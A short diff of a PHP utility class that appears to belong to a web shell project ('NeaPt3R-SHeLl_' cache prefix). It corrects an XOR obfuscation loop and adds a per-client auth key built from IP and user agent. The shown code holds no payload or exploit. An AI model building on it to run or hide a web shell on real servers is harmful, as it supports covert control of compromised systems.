@@ -64,7 +64,7 @@ class Utils
          * Szyfrowanie
          */
         for ($i = 0; $i < $iDataLen; ++$i) {
-            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 2)));
+            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 1)));
         }
 
         return $sNewData;
@@ -270,7 +270,6 @@ class Utils
         return substr(sha1_file($sScriptFilename), 0, 10) . '_';
     }
 
-
     public function cacheGetFile($sKey)
     {
         return $this->getTmpDir() . '/' . $this->getUniquePrefix() . $sKey;
@@ -300,6 +299,11 @@ class Utils
         $sValue = 'NeaPt3R-SHeLl_' . serialize($mValue);
 
         @ file_put_contents($sFile, $this->encrypt($sValue));
+    }
+
+    public function getAuthFileKey()
+    {
+        return md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
     }
 
 }
